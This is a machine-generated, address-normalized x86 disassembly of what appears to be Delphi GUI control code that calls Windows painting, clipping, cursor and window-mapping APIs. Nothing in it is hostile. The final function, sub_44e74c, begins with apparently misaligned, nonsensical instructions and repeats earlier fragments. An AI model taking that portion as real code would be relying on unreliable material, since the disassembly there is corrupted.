pop ebx
retn
sub_44d634
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44d5a8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403fdc
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_44d5b8
sub_44d664
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d6b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4042f8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d6c0
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax esi
call sub_4043ac
mov edx eax
mov eax ebx
call sub_44d610
sub_44d6e4
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_423c24
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44e7e8
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_423c24
mov [ ebx + 0x84 ] eax
sub_44d86c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44d85c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_44a804
mov eax esi
call sub_44a804
jmp r-xdata
sub_44d8a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_418304
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418198
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_418324
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44da7c
mov eax ebx
call sub_464de8
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403370
sub_44d924
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44d8a4
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44d8a4
jmp r-xdata
sub_44d948
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44d9de
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d9e5
lea eax [ ebp - 0xc ]
call sub_403eec
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
sub_44d9f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_418304
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4182a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44cfd4
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44da7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_454120
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44cfd4
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453e1c
push eax
call InvalidateRect
push ebp
call sub_44d9f0
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44db18
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_464dc0
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44e7e8
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403370
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44db7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_454120
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453e1c
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_44dc55
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_451c28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453e1c
push eax
call ReleaseDC
retn
sub_44dcdc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax edi
call sub_44e81c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44d178
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406ab0
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44e7e8
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_44b984
sub_44ddb0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44ddec
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_44de38
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_44de64
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44d5d8
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_44d5c4
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402978
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402978
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_453e1c
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_44df48
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_44df94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403370
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403370
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_44e058
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_44e0a4
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_44e0f0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e20b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424244
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e212
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_44e244
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403300
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_44d178
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403370
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403370
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403370
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403370
jmp r-xdata
sub_44e334
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416c28
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44e81c
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_44d5c4
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_44d5d8
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_416c78
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44e514
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44d14c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403370
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_453e1c
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ad48
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44e4ff
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_453e1c
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_453e1c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403174
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44cfd4
test esi esi
je r-xdata
sub_44e514
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403370
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44f398
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403370
mov eax esi
call sub_44d07c
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_44d038
mov ecx eax
xor edx edx
xor eax eax
call sub_416c50
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403370
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_44e5b8
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_44e5e8
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_44e654
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44e714
sub_44e684
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44e6b4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_44d178
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44e6e0
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44e714
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44e74c
push edx
or al 0x85
shl [ esi + 0x6 ] cl
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
